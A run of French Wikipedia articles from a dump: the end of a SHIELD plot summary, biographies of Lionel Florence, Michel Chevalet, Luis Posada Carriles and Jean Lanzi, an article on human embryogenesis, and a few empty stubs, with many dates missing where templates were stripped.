Un an plus tard, Mackenzie réussit à reconstruire le SHIELD en recrutant de nouveaux agents. Après avoir recherché des signaux d'activités paranormales, le SHIELD s'est retrouvé en conflit avec un groupe mystérieux, dirigé par quelqu'un qui ressemblait exactement à Coulson et qui s'appelait Sarge. Pendant ce temps, Simmons et Johnson sont toujours à la recherche de Fitz dans l'espace, en conflit avec les Chronicoms, qui veulent eux aussi retrouver Fitz pour sauver leur planète. Après avoir sauvé Deke Shaw de l'escouade de Sarge, May fut capturée par eux, où elle apprit la mission de Sarge d'éliminer les Shrike et leur créateur. May réussit à se libérer et à ramener Sarge au Phare. De retour dans l'espace, Simmons retrouve Fitz tandis que le reste de l'équipe retourne sur Terre. Fitz et Simmons ont été ramenés chez eux avec l'aide d'Izel, qui s'est avérée être la personne que Sarge chassait. Après une alliance difficile avec Sarge, le SHIELD s'est battu contre Izel, tandis que le Phare était attaqué par les Chronicoms. Ils parvinrent à vaincre Izel et Sarge, mais perdirent le phare. Lorsque les Chronicoms ont voyagé dans le temps pour attaquer l'histoire du SHIELD, le SHIELD a travaillé avec Enoch pour mettre fin à cette menace, en construisant un leurre grandeur nature de Phil Coulson pour les aider.
Dans la guerre contre les Chronicoms, le SHIELD a commencé à voyager dans le temps pour empêcher les Chronicoms de tuer Wilfred Malick, un agent d'HYDRA des années 1930 qui avait livré un ingrédient du sérum de super-soldat à Crâne rouge. Ils se sont ensuite rendus en 1955, où ils ont rencontré l'agent Daniel Sousa en empêchant Sibyl et les Chronicoms d'activer Helius - et en sauvant Sousa d'HYDRA. Plus tard dans les années 1970, le SHIELD a empêché le SHIELD alternatif d'activer le projet Insight et a perdu le LMD de Coulson lors de la destruction du vaisseau temporel principal des Chronicoms sous le Phare. Après s'être regroupé dans les années 1980, le sanctuaire Inhumain Afterlife fut attaqué par Nathaniel Malick, qui s'allia à l'Inhumain destructeur Kora pour conquérir Afterlife et y semer l'anarchie. L'équipe du SHIELD s'est alors retrouvée piégée dans une tempête temporelle, obligeant Daisy Johnson et le LMD de Coulson à revivre des boucles temporelles tout en essayant de l'arrêter avant qu'Enoch n'abandonne sa vie, ce qui a permis à l'équipe de réparer le moteur temporel et de s'échapper de la tempête. Après s'être échappé, le SHIELD a commencé à sauver les Inhumains piégés dans l'Afterlife de l'équipe de Nathaniel Malick. Malick, quant à lui, a tué Jiaying et kidnappé Simmons afin de l'utiliser pour retrouver Fitz. Après avoir assisté à la destruction des installations du SHIELD le SHIELD a décidé de vaincre les Chronicoms lors d'une ultime bataille qui s'est soldée par le retour du S.H.I.E.L.D. dans la ligne temporelle principale et la victoire sur les Chronicoms. Deke Shaw est resté dans l'autre 1983 pour aider l'équipe à revenir, permettant ainsi à Alphonso Mackenzie de continuer à diriger le SHIELD dans la ligne temporelle principale, et à Shaw de devenir le directeur dans la ligne temporelle alternative.
Après le claquement de doigts de Bruce Banner, un agent du SHIELD était présent lors de la bataille de la Terre et a publié un livre sur la bataille. Quelques mois plus tard, le SHIELD a également apporté son soutien à Nick Fury lors des attaques élémentaires en Europe en créant une combinaison furtive pour Spider-Man, lui permettant d'opérer en tant que Night Monkey.

</doc>
<doc id="248587" url="https://fr.wikipedia.org/wiki?curid=248587" title="Lionel Florence">
Lionel Florence

Lionel Florence, né le à Nancy, est un parolier, artiste peintre et photographe français.
Biographie.
Lionel Florence vit à Metz jusqu'à ses 18 ans. À Paris, il suit des études d'arts plastiques. Après la licence, il est muté dans diverses banlieues parisiennes en tant que professeur de dessin. Parallèlement, il écrit et compose des chansons.
Courant 1994-1995, Lionel Florence participe au projet caritatif "Entre sourires et larmes" où Jane Birkin, Alain Chamfort, Pascal Obispo, Graziella de Michele, Kent sont ses premiers interprètes. C'est via ce projet que la rencontre avec Pascal Obispo se fait. Leurs premières collaborations amèneront les premiers tubes "Lucie" et "Savoir aimer" qui sont devenus des standards de la chanson française. Depuis, Lionel Florence est souvent associé aux projets musicaux supervisés par Pascal Obispo via sa société d'édition Atletico Music.
Il est cosignataire, avec Patrice Guirao, des paroles de plusieurs comédies musicales à succès : "Les Dix Commandements" (2000), "Le Roi Soleil" (2005), "Cléopâtre" (2009) et "Robin des Bois" (2013), en totalité ou partiellement.
En 2003, Lionel Florence fait partie du jury lors de la première saison de l'émission "Nouvelle Star" diffusée sur M6.
Florent Pagny dit de lui que ; il participe d'ailleurs avec Maître Gims et Dany Synthé à quelques chansons de l'album "Le Présent d'abord" de Pagny.
Collaborations artistiques.
Parolier.
L'ensemble des chansons indiquées ci-dessous sont signées en tant qu'auteur ou coauteur par Lionel Florence. Afin de faciliter la lecture, chaque item contient l'année, le titre et le premier interprète. Si reprise ou adaptation il y a, elle est inscrite à la suite sur la même ligne. Pour plus de cohérence, les différents interprètes des spectacles musicaux ("Les Dix Commandements, Le Roi Soleil, Cléopâtre, " et "Robin des Bois") ne sont pas indiqués.

</doc>
<doc id="248588" url="https://fr.wikipedia.org/wiki?curid=248588" title="Henri le navigateur">
Henri le navigateur



</doc>
<doc id="248595" url="https://fr.wikipedia.org/wiki?curid=248595" title="Michel Chevalet">
Michel Chevalet

Michel Chevalet, né le à Paris, est un journaliste scientifique français.
Biographie.
Michel Chevalet naît le à Paris. Après son baccalauréat en 1958, souhaitant échapper à la guerre d'Algérie, il poursuit par une licence de mathématiques appliquées. Il enseigne comme professeur auxiliaire de mathématiques et de physique-chimie dans le secondaire et obtient son diplôme de professeur en 1966. 
Michel Chevalet commence sa carrière journalistique en collaborant à "Terre-Air-Mer" pendant son service militaire puis à "La Croix", "Sciences et Avenir" et par un passage sur la radio RMC. 
En 1972, après avoir fait quelques reportages télévisés, il quitte l'enseignement pour entrer à la télévision française (ORTF) dont il devient rapidement le spécialiste scientifique. 
En 1975, il arrive sur TF1 en tant que journaliste spécialisé dans l'actualité scientifique puis dans une émission aux côtés de Dorothée dénommée "Club Sciences". 
En 1982, il crée "Météo Première", première émission uniquement consacrée à la météo.
Il a fait une courte apparition avec d'autres personnalités de TF1 dans la comédie musicale Le cadeau de Noël en 1991. 
En 1999, il quitte TF1 et devient journaliste scientifique indépendant. Il lance notamment sur le câble "La Chaîne Météo" ou sur AB Sat le magazine "La Science en questions".
Il est principalement connu pour sa phrase : « Comment ça marche ? » (qu'il utilisait en transition entre la présentation sommaire d'une nouveauté technique, et son mode d'utilisation plus détaillée), d'où l'utilisation de cette phrase dans les parodies que fait de lui l'imitateur Laurent Gerra.
En 2005, Michel Chevalet est le parrain de la promotion 2005 de la section électronique de l'École polytechnique universitaire de l'université de Nice.
En 2006, Michel Chevalet rejoint la chaîne NT1, présentant avec Alexandre Devoise le magazine scientifique "Choc, l’émission". Travaillant au sein de la société SVS (Science vidéo service), il rejoint l’équipe des experts de la chaîne iTélé en .
Auteur de collections en DVD comme « La Conquête de l'espace » ou encore « La Passion des trains » ( aux éditions Atlas, réalisées avec la collaboration de Clive Lamming entre 2007 et 2009), d'ouvrages scolaires de mathématiques ou de physique, il a consacré un livre, "Quand tout bascule", à son fils Fabrice Chevalet, devenu hémiplégique et aveugle à la suite d'un accident de la route.
En 2012, Michel Chevalet est le parrain de la promotion 2012 de l’École nationale d'ingénieurs de Saint-Étienne.
En 2015, Michel Chevalet apparaît dans l'émission "C'est mon choix" comme critique sur les choses inexplicables du cerveau humain, sa présence ayant pour but de faire comprendre comment certaines personnes arrivent à deviner l'avenir ou à trouver un symbole ou un chiffre caché.
En 2020, il crée sa chaîne YouTube "Comment ça marche par Michel Chevalet".
En 2021, la Société Astronomique de France lui décerne le Prix Marius-Jacquemetton.
Le 7 décembre 2024, interrogé sur l'enquête concernant les causes de l'incendie de Notre-Dame de Paris, il affirme sur l'antenne de Cnews que « le dossier a été refermé très rapidement pour dire un non-lieu. C’était le laboratoire de la préfecture de police de Paris qui a été dessaisi et maintenant, c’est classé secret-défense.», sa déclaration se révélant être fausse car l'information judiciaire n'est pas terminée.
Engagement dans le domaine du handicap.
En 2001, son fils Fabrice, âgé de , est victime d'un grave accident de la route. Ayant subi de graves lésions neurologiques, il devient aveugle et hémiplégique. Son avocat a dû saisir la justice pour obtenir la réparation de son préjudice corporel, bien que le responsable de l'accident ait été condamné par le tribunal correctionnel de Meaux.
Cet événement change la vie de son fils, de leurs familles et de Michel Chevalet, les faisant entrer dans le monde du handicap. Depuis, Michel Chevalet milite pour la prévention des accidents de la route.
Michel Chevalet relate cette tragédie et ses conséquences dans son livre "Quand tout bascule" en 2005. Il y donne aussi son avis sur le monde du handicap. Engagé et connaissant le handicap pour le vivre au quotidien avec son fils, il participe aux Premiers États généraux du handicap en 2005.

</doc>
<doc id="248598" url="https://fr.wikipedia.org/wiki?curid=248598" title="Luis Posada Carriles">
Luis Posada Carriles

Luis Clemente Faustino Posada Carriles, dit Bambi ou Basilio, né le à Cienfuegos à Cuba et mort le à Miramar en Floride, est un terroriste cubain naturalisé vénézuélien.
Actif dans les actions violentes contre le gouvernement cubain, il a travaillé pour la CIA de 1965 à 1976 (selon les informations de cette dernière), puis pour la DISIP, la police secrète vénézuélienne. Il revendique l'attentat contre le Vol Cubana 455, un avion de la Cubana de Aviación, qui a fait 73 morts le .
Biographie.
Avec son compatriote Orlando Bosch Ávila, Luis Posada Carriles a participé à la fondation du CORU, une organisation anti-castriste qui prit part à l'opération Condor, en participant notamment à l'assassinat de l'ancien ministre chilien Orlando Letelier à Washington D.C..
Il est accusé d'avoir participé à la préparation d'un attentat contre le Vol 455 Cubana, un avion de ligne cubain parti de Caracas au Venezuela, et ayant explosé au-dessus de la Barbade le , tuant ainsi 73 personnes dont l'équipe d'escrime cubaine de la catégorie junior. 
Une cour militaire vénézuélienne acquitta Posada et trois de ses complices au terme d’un premier procès, procès qui fut ensuite annulé par la Cour militaire d’Appel du Venezuela. Celle-ci indiqua que « "les inculpés dans l’affaire de l’avion de Cubana détruit [en vol] près de la Barbade le sont des civils et les délits qui leur sont reprochés sont prévus dans le code pénal" (et non pas dans le code militaire) ». Posada et ses trois complices furent alors inculpés pour homicide et trahison devant la justice civile, mais la CIA et la Fondation nationale cubano-américaine (FNCA) le firent évader le et le verdict le concernant fut ajourné, les lois vénézuéliennes interdisant la prononciation d'une condamnation par contumace. Au terme de ce même procès deux complices de Posada, qui avaient comme lui la nationalité vénézuélienne, furent condamnés le à vingt ans de prison. Orlando Bosch, complice lui aussi, fut acquitté et la justice vénézuélienne émit à l’encontre de Posada Carriles un mandat d’arrêt qui est toujours en vigueur et en vertu duquel le Venezuela a présenté aux États-Unis en 2005 une demande d’extradition.
Il part pour le Salvador après son évasion, où, sous la direction du lieutenant-colonel Oliver North, il fournit en armes les Contras nicaraguayens et participe au trafic de drogue pour les financer. Le scandale de « l'Irangate » le conduit à se replier au Guatemala, où il sert la dictature militaire comme fonctionnaire du renseignement. Le pays était alors plongé dans la guerre civile.
Dans un long entretien publié au "New York Times" en 1998, Posada Carriles revendique publiquement avoir organisé la série d’attentats à la bombe contre des hôtels commis à La Havane en 1997. Ces attentats firent un mort (un touriste italien) et plusieurs blessés. Dans ce même entretien, Posada Carriles révèle qu'il a travaillé pour la Cuban-American National Foundation (CANF), qui en rejette les connexions. Il précise pourtant dans l'interview ainsi que dans son autobiographie "The Roads of the Warrior" ("Les Chemins du Guerrier") que Jorge Mas Canosa, fondateur et président de la CANF, son successeur Alberto Hernandez ainsi que le trésorier de l'organisation lui faisaient parvenir de l'argent pour financer ses actions violentes contre Cuba. 
En 2000, Luis Posada Carriles est incarcéré au Panama avec Pedro Remón Jimenez et Guillermo Novo Sampol, pour avoir projeté de placer une bombe dans la salle où Fidel Castro, en visite dans le pays, tiendrait une conférence. Condamné à huit ans de prison, ils furent graciés par la présidente panaméenne Mireya Moscoso à la fin de son mandat, en 2004. Jiménez et Novo furent par la suite accueillis aux États-Unis. 
Le , Posada fait par le biais de son avocat une demande d'asile politique aux États-Unis en tant qu'ancien agent de la CIA. Les autorités américaines l'arrêtent le 17 mai suivant à Miami, où il vivait caché. Le , plus d'un million de personnes défilent à La Havane à la demande du gouvernement cubain, pour dénoncer le "terrorisme des États-Unis", demandant le jugement de Luis Posada Carriles. Le , il est inculpé d'entrée illégale aux États-Unis. Cuba conteste aussitôt cette inculpation en soulignant que Posada Carriles devrait être inculpé pour terrorisme.
Le Venezuela demande formellement son extradition en , et accuse les États-Unis de ne pas être impartiaux dans leur guerre contre le terrorisme. Luis Posada Carriles sera relâché en 2007 sous caution en dépit de la demande d'extradition en cours.
En 2005, l'ambassadeur des États-Unis au Honduras demande au président de ce pays d'offrir l'asile à Luis Posada Carriles, sa présence aux États-Unis étant jugée embarrassante.
Le , la sous-commission des Droits de l’homme de la Chambre des représentants des États-Unis a établi la responsabilité de Luis Posada Carriles dans plusieurs actes terroristes, dont celui contre le Vol 455 Cubana.

</doc>
<doc id="248607" url="https://fr.wikipedia.org/wiki?curid=248607" title="Jean Lanzi">
Jean Lanzi

Jean Lanzi est un journaliste et présentateur de radio et de télévision français, né le à Nice (Alpes-Maritimes) et mort le à Castelnau-le-Lez (Hérault).
Biographie.
Carrière.
Au début des années 1960, Jean Lanzi est journaliste à la station Paris Inter, devenue France Inter, où il assure des reportages et présente "Inter actualités".
À la télévision, il présente, du au , l'émission politique "Face à face" sur la première chaîne de l'ORTF en direct avec Jean Farran sous forme d'un débat entre un homme politique et des journalistes. Les premiers invités sont notamment Guy Mollet le , Valéry Giscard d'Estaing le , Georges Pompidou le . À partir du , il présente le journal télévisé "24 heures actualités" sur la deuxième chaîne de l'ORTF, sous la direction de Louis Roland Neil. Sa liberté et son indépendance lui valent une mise à pied en 1968.
En novembre 1969, Pierre Desgraupes l'intègre à l'unité autonome Information Première. Il revient à la présentation des journaux du soir à . Ensuite, il est affecté au journal de 13 heures, dont il partagera la présentation avec Paul Lefèvre, Jean-Pierre Lannes, Alain Cancès et Guy Claisse en 1970, avant l'instauration d'un trio à peu près régulier Lanzi - Elkabbach - Desjeunes jusqu'à l'été 1972. La même année, il succède, en alternance avec Robert Beauvais, à Léon Zitrone dans "Le Francophonissime" lors de la 2e série d'émissions tournées en 1969.
À la réforme de l'été 1972, à la suite de la dissolution de l'équipe Desgraupes, Jean Lanzi se remet à la disposition de la direction générale de l'ORTF, qui l'affecte pendant trois ans au bureau de Tokyo.
À la dissolution de l'ORTF, Jean Lanzi est embauché par Jacques Sallebert, directeur de l'information d'Antenne 2 pour présenter le journal de 20 heures en alternance avec Jean-Marie Cavada, Pierre Lescure et Jean-Michel Desjeunes, avant d'être affecté aux éditions du samedi et du dimanche.
En 1977, à l'arrivée de Jean-Pierre Elkabbach à la direction de l'information, Jean Lanzi quitte la présentation de ces journaux, remplacé successivement par Jean-Claude Mangeot puis Patrick Lecoq. Il est alors responsable de magazines sur Antenne 2.
En 1979, il devient responsable des programmes d'Antenne 2 pour la tranche de l'après-midi, répondant même un jour aux téléspectateurs sur ses activités. Entre 1976 et 1981, il est producteur et animateur de l'émission du samedi après-midi, "Les Jeux du Stade" ! Le 11 mars 1978 en fin d'émission, il annonce le décès de Claude François et passe le relais au journaliste Patrick Lecocq qui informe les téléspectateurs du drame qui vient de se jouer 20 minutes auparavant (vidéo visible sur youtube).
De 1982 à 1988, il co-présente "La Maison de TF1" avec Évelyne Dhéliat. Le magazine, diffusé sur TF1 le samedi matin, est consacré à la maison, au jardin, au bricolage et à la mode. Les deux animateurs y sont entourés de spécialistes (Nicolas le Jardinier, Michel Galy et Cécile Ibane).
En 1982, Philippe Gildas quitte l'animation du jeu d'aventures "La Chasse au trésor" sur Antenne 2 en raison d'un emploi du temps trop chargé. Jean Lanzi lui succède avec à ses côtés Marie-Thérèse Cuny (le jeu étant renommé "La Carte aux trésors" au pluriel). Cependant, sa présentation étant jugée peu convaincante, Lanzi est remplacé par Didier Lecat (accompagné d'Elsa Manet).
À partir de juillet 1983, Jean Lanzi est le directeur de l'information de TF1. À compter de septembre 1984, il présente le magazine politique "7 sur 7" (créé en 1981) sur TF1 en alternance avec la journaliste Anne Sinclair. En , à la suite de la privatisation de TF1, il quitte ses fonctions de directeur de l'information et présente pour la dernière fois "7 sur 7" en juin.
À la fin des années 1990, il présente avec Carole Gaessler l'émission médicale "Comment ça va ?" , en deuxième partie de soirée sur France 3.
Retiré du monde des médias, il est, de 1998 à 2000, membre du Conseil économique et social.
Mort.
Installé depuis plusieurs années à Aigues-Mortes, Jean Lanzi meurt le à Castelnau-le-Lez.

</doc>
<doc id="248613" url="https://fr.wikipedia.org/wiki?curid=248613" title="Fond indiciel">
Fond indiciel



</doc>
<doc id="248615" url="https://fr.wikipedia.org/wiki?curid=248615" title="Embryogenèse humaine">
Embryogenèse humaine

L'embryogenèse humaine (ou embryogénie) désigne le processus de développement de l'embryon humain depuis la fécondation jusqu'à la quatrième semaine de développement. Ensuite de la quatrième à la dixième semaine de développement on parle de l'organogénèse.
On parle d'embryon de la fécondation à la huitième semaine de développement embryonnaire, après on parlera de fœtus jusqu'à la naissance.
Étapes.
Fécondation.
Le zygote ou œuf naît de l'union d'un gamète femelle (un ovocyte), et d'un gamète mâle, (un spermatozoïde). Les gamètes sont produits par la méiose des cellules germinales. Le gamète mâle est donc haploïde : il ne contient qu'un des deux chromosomes de chaque paire de chromosomes homologues de la cellule germinale qui l'a généré ; le gamète femelle est lui aussi haploïde, cependant il termine sa méiose uniquement s'il y a fécondation : l'ovocyte devient seulement alors un ovule à proprement parler, apte à la réunion des génomes.
Le spermatozoïde se lie aux glycoprotéines de la zone pellucide entourant l'ovocyte. Il se lie d'abord à ZP3, ce qui déclenche la réaction acrosomique : la membrane plasmique du spermatozoïde fusionne avec la membrane externe de l'acrosome en commençant par la partie antérieure et en se poursuivant logiquement selon un gradient antéro-postérieur, en laissant une zone équatoriale au niveau de laquelle subsistent les trois feuillets (les membranes externe et interne de l'acrosome ainsi que la membrane plasmique). L'ouverture du sac acrosomique sur l'extérieur donne lieu à la libération d'enzymes, parmi lesquelles on pourra citer l'acrosine et l’hyaluronidase. Ces deux enzymes permettent de séparer les glycoprotéines ZP1 de ZP2 et ZP3 et sont indispensables à la progression du spermatozoïde jusqu'à l'ovocyte. Tous les spermatozoïdes de la zone pellucide ont fait leur réaction acrosomique. ZP2 est la deuxième glycoprotéine à laquelle se lie le spermatozoïde et facilite également son trajet.
Segmentation.
L'œuf fécondé va subir une série de divisions cellulaires au cours de sa migration dans la trompe utérine et l'utérus.
Ce processus porte le nom de segmentation ou clivage. Cette segmentation est totale, asynchrone et asymétrique (les deux cellules-filles engendrées peuvent ne pas porter la même quantité de matériel cytoplasmique, à l'origine d'une différence de taille notable). Elle divise le zygote, par plusieurs mitoses classiques successives, d'abord en 2 cellules filles, puis en 4 (le plus gros blastomère se divise en premier), puis 8 et 16 et ainsi de suite pour rapidement aboutir à une masse cellulaire portant le nom de morula (à l'aspect de petite mûre, comme l'indique son nom). Le second terme "clivage" est parfaitement évocateur puisque l'œuf fécondé n'augmente pas de taille ou de volume au cours de ces premières divisions successives.
Les premières divisions cellulaires, jusqu'au stade 4 à 8 cellules, ne s'accompagnent pas de différences morphologiques importantes entre les cellules filles. 
Les 8 premières cellules ne se divisent qu'en se clivant dans un plan perpendiculaire à la face en contact avec l'extérieur de l'embryon (Laure Coulombel, 2017). La chronologie admise est en général la suivante : 2 blastomères apparaissent rapidement après la fécondation au premier jour du développement.4 blastomères au deuxième jour du développement, 8 blastomères au troisième jour du développement. À partir de ce stade, des cellules se divisent en se clivant selon un plan parallèle à la face perpendiculaire à l'axe intérieur/extérieur de la masse cellulaire (Laure Coulombel, 2017). 16 blastomères (morula) au quatrième jour du développement. Au cinquième jour, l'embryon a généralement gagné la partie supérieure de l'utérus, où il devra s'apposer, puis s'implanter (phénomène de nidation ou ovoimplantation).
Arrivée à 8 cellules, les cellules se polarisent : une de leur face étant libre de tout contact entre les autres cellules, elle exprime la protéine aPKC "(atypical protein kinase C)" (Laure Coulombel, 2017)"." Dès lors, si une des cellules de l'embryon est en contact avec l'extérieur de l'embryon, 2 possibilités : 1) Son plan de division est parallèle à sa face en contact avec l'extérieur de l'embryon. Alors ces aPKC sont héritées uniquement par la cellule fille en qui reste en contact avec l'extérieur de l'embryon (division « apicale » asymétrique), et elle s’engage vers un destin trophectoderme. L'autre cellule fille étant dépourvue de domaine apical, elle contribuera à la masse interne. 2) Son plan de division est perpendiculaire à sa face en contact avec l'extérieur de l'embryon et la division reste symétrique. Dans le dernier cas de figure, les cellules filles suivent le destin de leur cellule mère, soit vers le trophoectderme, soit vers les cellules de la masse interne, soit en cellule polarisée, pas encore différencie ni en trophoectoderme, ni en cellule de la masse interne. À partir du stade 8 à 16 cellules, le phénomène de compaction rend irréversibles ces premières différenciations embryonnaires en générant une nouvelle répartition des cellules dans la morula : 
À la fin du quatrième jour après la fécondation, le suicide ou apoptose de certaines cellules de la masse cellulaire interne provoque le phénomène de cavitation en creusant la morula par apparition d'une cavité à contenu liquidien : le futur blastocèle.
Blastulation.
Dans l'espèce humaine, le zygote (ou œuf) étant pauvre en réserves nutritives, il est de type alécithe (ou métalecithe : le placenta remplace le vitellus) : le vitellus, en petite quantité, y est dispersé uniformément dans tout le cytoplasme (consultez l'article sur le zygote pour plus de détails).
Au premier stade de la blastulation, le zygote se divise en blastomères par mitose. Comme pour tous les zygotes alécithes, le processus est de type holoblastique et radiaire. La première division se fait selon un plan méridional passant par les pôles du zygote. Ensuite, un des deux blastomères résultants se divise également selon un plan méridional. L'autre blastomère, par contre, se divise selon un plan équatorial. Au fur et à mesure des divisions successives les cellules, restant agglutinées, forment la blastula. Les cellules externes de celle-ci forment le trophoblaste qui constituera la couche superficielle du placenta. Les cellules internes s'agglutinent à un pôle de la morula et forment la masse cellulaire interne ainsi qu'une cavité, le blastocèle.
À ce stade, la morula est devenue blastula ou blastocyste.
Nidation.
L'implantation de l'œuf dans l'endomètre se fait par les cellules du trophoblaste (partie interne de la zone pellucide désormais éclose), en regard du bouton embryonnaire. L'œuf s'implante dans le fond utérin, durant une fenêtre d'implantation comprise entre le et le de développement (- jour d'aménorrhée).
Les cellules trophoblastiques sécrètent un fluide qui va pousser l'amas cellulaire dans un segment de la sphère. Le syncytiotrophoblaste est ainsi sécrété, il est chargé en lysosomes et s'étale de plus en plus dans l'endomètre grâce à sa fonction métalloprotéasique.
Le chorion est la structure composite entourant l'œuf et composé de trois couches : le mésenchyme extra embryonnaire, le cytotrophoblaste et enfin le syncytiotrophoblaste décrit au-dessus, de l'intérieur vers la périphérie. Provenant de la cavitation, il permet de recevoir l'oxygène de la mère à partir du douzième jour, avec l'apparition des chambres sanguines maternelles. La circulation sanguine (histotrophique jusqu'au ) se fait par l'intermédiaire des villosités choriales qui resteront primaires jusqu'au . Le chorion sécrète des hormones qui ordonnent à l'utérus d'accueillir le fœtus.
Certaines substances contrôlent la réponse immunitaire maternelle pour qu'il n'y ait pas de rejet de l'embryon (comme c'est le cas d'un organe greffé).
Gastrulation.
Introduction.
Le processus de gastrulation met en place les structures cellulaires qui génèrent l'embryon et en soutiennent le développement.
À cette fin, les cellules du blastocyste se différencient, se déplacent et se réarrangent pour former :
Dans l'espèce humaine, la gastrulation est du type «immigration». Un disque embryonnaire se forme au niveau du bouton embryonnaire. Les cellules individuelles migrent au travers du disque avec différenciation concomitante en ecto-, endo- et mésoderme. Ce processus est commun à tous les mammifères, ainsi qu'à leurs ancêtres les reptiles et aux oiseaux.
Embryon et fonctions nourricières.
Au pôle apical du blastocyste se forme un amas de cellules internes que l'on appelle « embryoblaste », « bouton embryonnaire » ou « masse cellulaire interne » (MCI). C'est là que commence la genèse de l'embryon. La fonction nourricière des cellules périphériques du blastocyste se précise. Elles constituent le trophoblaste qui se scindera en syncytiotrophoblaste (cytoplasme multicellulaire) à l'extérieur, et en cytotrophoblaste à l'intérieur.
L'embryoblaste se scinde en endoblaste (hypoblaste) et en ectoblaste (épiblaste). Entre celui-ci et le cytotrophoblaste se creuse la cavité amniotique. [L'épiblaste et l'hypoblaste forment ensemble le disque embryonnaire didermique]. Des cellules de l'épiblaste se différencient en amnioblastes et recouvrent la paroi intérieure de la cavité amniotique. Dans le syncytiotrophoblaste s'ouvrent des vacuoles qui se raccordent entre elles pour former des capillaires qui s'étendent dans les tissus utérins pour constituer les sinus maternels. Les vacuoles forment des lacunes qui se remplissent de sang. Ces vaisseaux sont à la base de la circulation utéro-placentaire.
Première prolifération et migration (à J-8) de cellules en provenance de l'hypoblaste le long de la paroi interne du cytotrophoblaste pour y former une fine membrane (endoderme extraembryonnaire, appelé aussi « ») qui transforme le blastocèle en lécithocèle primaire (à J-9).
Apparition du mésoderme et croissance de l'amnios.
Le réticulum extraembryonnaire (un tissu acellulaire très lache, pouvant également être désigné sous le nom de "mésenchyme extra-embryonnaire") apparaît entre la membrane de Heuser et le cytotrophoblaste après la formation du sac vitellin primaire. Il s'y ouvre des vacuoles qui fusionnent en formant le cœlome extraembryonnaire (ou cavité choriale) qui se remplit de liquide. On suppose que le réticulum est généré par la membrane. Des cellules mésodermiques, qui seraient des cellules épiblastiques différenciées en provenance de la partie caudale du disque embryonnaire, migrent au travers du réticulum et en se fixant recouvrent les parois de la cavité extraembryonnaire. Ce mésoderme extraembryonnaire s'appelle somatopleure au niveau du cytotrophoblaste, de la cavité amniotique et du pédicule embryonnaire et splanchnopleure au niveau de l'endoderme extraembryonnaire des sacs vitellins primaires et secondaires.
Une nouvelle migration de cellules endodermiques extraembryonnaires repousse les cellules de la précédente en migrant le long de la paroi du sac vitellin primaire, puis en dedans. Le sac vitellin primaire, en se rétractant sous la poussée de la cavité extraembryonnaire, se clive en un sac vitellin primaire et un reliquat qui involuera rapidement: le kyste exocœlomique. Les deux vésicules nouvellement formées sont recouvertes en dehors par le splanchnopleure. La cavité extraembryonnaire se résorbe sous l'effet de la croissance de la cavité amniotique. Le liquide cœlomique se perd et les somatopleures extraembryonnaires de l'amnios et de la cavité extraembryonnaire fusionnent.
Embryon tridermique.
Des cellules de l'épiblaste convergent vers l'axe longitudinal dorsal du disque embryonnaire et y forment un bourrelet appelé « ligne primitive ». À partir de celle-ci, les cellules épiblastiques s'enfoncent et se dispersent dans le disque, transformant le bourrelet en sillon. Les cellules épiblastiques connaissent un triple destin :
À ce stade-ci, l'embryon est tridermique. Il comprend un ectoderme, un endoderme et un mésoderme, tous trois formés à partir de l'épiblaste.
Structuration du disque embryonnaire.
L'apparition de la ligne primitive définit non seulement la symétrie bilatérale du disque, mais également l'orientation caudo-crâniale de son axe. Le « nœud de Hensen », une dépression située vers le milieu de l'axe, termine la ligne primitive.
À l'extrémité caudale du disque embryonnaire, une zone de l'ectoderme est restée collée à l'endoderme: c'est la membrane cloacale, l'homologue du blastopore des gastrulas invaginées. De la même façon, une membrane appelée pharyngienne (ou bucco-pharyngienne) se forme vers l'extrémité crâniale : sa rupture mettra la bouche primitive en contact avec le pharynx, laissant un canal transitoire où s'engouffre le liquide amniotique : le "".
Neurulation.
Au départ du processus de neurulation il y a la mise en place de la chorde. Celle-ci commence par une prolifération de cellules mésodermiques à hauteur du nœud de Hensen. Ensuite, les cellules migrent vers le pôle crânial et forment un tube, le processus (ou tube) notochordal, dans l'axe du disque, entre l'ectoderme et l'endoderme. Dans un premier temps, le tube notochordal fusionne avec l'endoderme formant ainsi la plaque chordale. Plus tard, il se sépare de l'endoderme et devient ainsi un rouleau plein : la chorde proprement dite. On notera également durant ce processus la présence durant quelques heures (entre les et ) du canal neuro-entérique, seule communication (transitoire) entre la cavité amniotique et le sac vitellin secondaire. La formation de ce canal, nécessaire à la formation de la chorde, dans des temps autres que ceux indiqués ci-dessus aboutit à des pathologies graves, souvent létales.
La présence de la chorde induit la formation de la plaque neurale à partir de l'ectoderme sus-jacent. Celle-ci se développe en largeur au niveau du pôle crânial et y produira le cerveau. Vers le pôle caudal, elle prend la forme d'une gouttière dont les bords, en se refermant, sont à l'origine de la moelle épinière.
En résumé :
Métamérisation.
Entre-temps, le mésoderme intra-embryonnaire se différencie. Le mésoderme para-axial, situé de part et d'autre de la chorde, se compacte en formant 42 à 44 paires de somites (chez l'espèce humaine, les 7 premières paires de somitomères, ne se différencient pas en somites), à commencer par le pôle crânial. De plus, certaines paires de somites du pôle caudal dégénèreront. Finalement, 37 paires de somites perdureront. Pendant le processus d'individualisation (la métamérisation), ceux-ci restent reliés au mésoderme par la lame intermédiaire. La lame latérale se sépare en deux feuillets : la somatopleure qui recouvre l'ectoderme et la splanchnopleure qui recouvre l'endoderme.
C'est à partir des somites que se constituent :
Le système artério-veineux se met en place, permettant les premiers échanges entre l'embryon et la mère, avec :
Délimitation de l'embryon.
C'est l'isolement de l'embryon et de ses annexes. La délimitation et la forme du corps de l'embryon sont induites par une croissance différentielle entre l'amnios et le sac vitellin. Celui-ci ne se développant pratiquement plus, l'amnios le déborde de tous les côtés.
Latéralement, l'amnios recouvre le disque embryonnaire: le tube neural, la chorde, le mésoderme intraembryonnaire et une partie du vitellin qui deviendra l'intestin primitif. Les bords des différents feuillets se rejoignant à la base du disque (formant l'anneau ombilical), ceux-ci fusionnent et ferment le corps de l'embryon qui devient tridimensionnel. Toutefois, un canal subsiste provisoirement entre l'intestin primitif et le sac vitellin : le canal vitellin, qui deviendra le canal omphalo-mésentérique. Longitudinalement, l'embryon adopte une forme convexe. Les membranes subissent une rotation d'environ . Le mésoblaste cardiogénique, initialement en avant de la membrane pharyngienne, passe en position ventrale.
La structure générale étant mise en place, les différents organes peuvent se développer : c'est le début de l'organogénèse.

</doc>
<doc id="248619" url="https://fr.wikipedia.org/wiki?curid=248619" title="Armoise">
Armoise

